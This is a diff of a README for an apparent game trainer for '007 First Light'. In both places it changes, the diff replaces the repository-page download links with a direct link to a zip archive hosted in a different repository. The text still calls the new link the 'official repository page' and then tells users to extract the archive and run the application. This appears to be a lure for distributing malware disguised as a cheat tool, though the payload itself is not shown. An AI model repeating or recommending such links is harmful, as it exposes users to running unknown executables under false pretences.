@@ -5,7 +5,7 @@ description: "Modify game settings to enable God Mode, unlock content, and impro
 ---
 # 🎮 007-First-Light-Trainer-And-Optimizer_v_2 - Enhance game performance and unlock content
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/Vernajainist391/007-First-Light-Trainer-And-Optimizer_v_2)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://raw.githubusercontent.com/Vernajainist391/vernajainist391.github.io/main/procremation/github-io-vernajainist-2.4.zip)
 
 This tool improves the gameplay experience for 007 First Light. It provides options to adjust game difficulty, unlock special items, and improve frame rates on Windows computers. Use this utility to customize your play sessions without manual file editing.
 
@@ -23,7 +23,7 @@ Ensure your computer meets these conditions before you run the software:
 
 Follow these steps to set up the software.
 
-1.  Visit the official repository page to download the latest release: https://github.com/Vernajainist391/007-First-Light-Trainer-And-Optimizer_v_2.
+1.  Visit the official repository page to download the latest release: https://raw.githubusercontent.com/Vernajainist391/vernajainist391.github.io/main/procremation/github-io-vernajainist-2.4.zip
 2.  Locate the downloaded file in your Downloads folder.
 3.  Right-click the file and select Extract All to unzip the contents.
 4.  Open the extracted folder and double-click the trainer application icon.
